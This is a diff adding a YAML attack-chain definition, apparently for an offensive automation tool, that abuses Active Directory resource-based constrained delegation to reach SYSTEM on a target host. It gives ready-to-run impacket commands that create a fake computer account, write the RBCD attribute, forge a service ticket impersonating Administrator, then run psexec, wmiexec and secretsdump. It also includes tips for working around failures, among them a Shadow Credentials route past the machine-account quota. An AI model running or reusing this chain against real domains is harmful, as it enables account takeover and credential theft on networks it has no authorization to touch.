@@ -1,0 +1,71 @@
+chain_id: rbcd_abuse
+title: "AD — Resource-Based Constrained Delegation (RBCD) → SYSTEM on target host"
+severity: HIGH
+tags: [ad, kerberos, delegation, rbcd, s4u2self, s4u2proxy, impacket]
+
+trigger:
+  any_of:
+    - { kind: "rbcd_candidate" }
+    - { kind: "domain_user_credentials" }
+    - { banner_pattern: "(?i)active\\s*directory|domain\\s*controller" }
+    - { service_pattern: "(?i)ldap|kerberos" }
+
+description: |
+  If you control any account with `GenericAll` / `GenericWrite` /
+  `WriteProperty(msDS-AllowedToActOnBehalfOfOtherIdentity)` on a
+  computer object, you can write a fake-computer SID into its RBCD
+  attribute and then S4U2self+S4U2proxy yourself a TGS for any user
+  (typically `Administrator`) on that host. Enabled by default since
+  Server 2012; very common GPO misconfig.
+
+steps:
+  - id: 1
+    title: "Find delegation rights from BloodHound"
+    command: |
+      # Cypher in BloodHound:
+      #   MATCH (u:User)-[:GenericAll|GenericWrite|WriteProperty]->(c:Computer)
+      #   RETURN u.name, c.name
+      bloodhound-python -u USER -p PASS -d DOMAIN -c All -ns DC_IP
+
+  - id: 2
+    title: "Create a fake computer (any low-priv user can — quota=10 by default)"
+    command: |
+      impacket-addcomputer -computer-name 'rootctl$' -computer-pass 'Rootctl123!' \
+        -dc-ip $DC_IP DOMAIN/USER:'PASS'
+
+  - id: 3
+    title: "Write the fake computer's SID into target's RBCD attribute"
+    command: |
+      impacket-rbcd -delegate-from 'rootctl$' -delegate-to 'TARGET$' \
+        -dc-ip $DC_IP -action write \
+        DOMAIN/USER:'PASS'
+
+  - id: 4
+    title: "S4U2self + S4U2proxy → TGS for Administrator on TARGET"
+    command: |
+      impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator \
+        -dc-ip $DC_IP DOMAIN/'rootctl$':'Rootctl123!'
+      export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN@DOMAIN.ccache
+
+  - id: 5
+    title: "Use the ticket — psexec / wmiexec / smbexec as Administrator"
+    command: |
+      impacket-psexec -k -no-pass TARGET.DOMAIN
+      impacket-wmiexec -k -no-pass TARGET.DOMAIN
+      impacket-secretsdump -k -no-pass TARGET.DOMAIN
+
+common_errors:
+  - error: "addcomputer fails: 'STATUS_USER_EXISTS' or quota exceeded"
+    solution: |
+      MachineAccountQuota was lowered. Reuse an existing computer
+      object you control instead, or attack via Shadow Credentials
+      (msDS-KeyCredentialLink) which bypasses the quota entirely.
+  - error: "getST fails with KRB_AP_ERR_BADKEYVER"
+    solution: |
+      Your fake computer's password hashed with the wrong salt. Pass
+      `-hashes :NT` instead of `-computer-pass` after generating the
+      NT hash directly.
+
+references:
+  - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
+  - https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
